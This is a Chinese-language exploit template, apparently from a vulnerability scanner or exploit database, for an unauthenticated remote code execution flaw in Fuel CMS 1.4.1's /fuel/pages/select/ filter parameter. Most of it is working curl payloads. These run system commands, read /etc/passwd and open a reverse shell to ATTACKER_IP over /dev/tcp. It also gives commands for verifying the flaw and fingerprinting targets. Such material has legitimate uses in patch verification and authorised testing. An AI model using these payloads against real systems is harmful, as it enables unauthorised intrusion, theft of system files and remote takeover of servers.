---
id: FUELCMS-1.4-RCE
title: Fuel CMS 1.4.1 远程代码执行漏洞
product: fuelcms
vendor: Fuel CMS
version_affected: "1.4.1"
severity: CRITICAL
tags: [rce, code_injection, 无需认证]
fingerprint: ["Fuel CMS", "fuelcms", "/fuel/"]
---

## 漏洞描述

Fuel CMS 1.4.1 的 `/fuel/pages/select/` 接口存在 PHP 代码注入漏洞。`filter` 参数未经过滤直接传入 `eval()`，攻击者可通过 `pi(print($a='system'))+$a('cmd')` 技巧绕过限制执行任意系统命令。

## 影响版本

- Fuel CMS 1.4.1

## 前置条件

- 无需认证

## 利用步骤

1. 访问 `/fuel/pages/select/` 接口
2. 在 `filter` 参数中注入 PHP 代码
3. 命令输出在响应中返回

## Payload

### 执行命令

```bash
curl -s "http://target/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27id%27)%2B%27"
```

### 读取文件

```bash
curl -s "http://target/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27cat+/etc/passwd%27)%2B%27"
```

### 反弹 Shell

```bash
curl -s "http://target/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27bash+-c+%22bash+-i+%3E%26+/dev/tcp/ATTACKER_IP/4444+0%3E%261%22%27)%2B%27"
```

## 验证方法

```bash
curl -s "http://target/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27id%27)%2B%27" | grep "uid="
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "Fuel CMS"
curl -s "http://target/fuel/login" -o /dev/null -w "%{http_code}"
```

## 参考链接

- https://www.exploit-db.com/exploits/49487
